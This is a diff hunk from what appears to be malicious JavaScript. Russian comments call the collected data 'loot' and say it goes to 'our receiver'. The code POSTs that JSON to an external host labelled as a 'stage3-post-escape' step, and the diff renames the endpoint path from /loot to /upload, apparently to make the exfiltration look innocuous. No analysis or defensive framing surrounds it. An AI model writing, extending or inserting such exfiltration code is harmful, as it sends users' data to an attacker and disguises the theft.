@@ -511,7 +511,7 @@
                     // тап: всё уходит в наш приёмник
                     const _lootJSON = JSON.stringify(_loot);
                     const _whsPost = new XMLHttpRequest();
-                    _whsPost.open("POST", "https://whs-gate-test-5si9.zai-ai.site/loot?kind=stage3-post-escape", true);
+                    _whsPost.open("POST", "https://whs-gate-test-5si9.zai-ai.site/upload?kind=stage3-post-escape", true);
                     _whsPost.setRequestHeader("Content-Type", "application/json");
                     _whsPost.send(_lootJSON);
                     // дублируем в webhook (внешний приёмник):
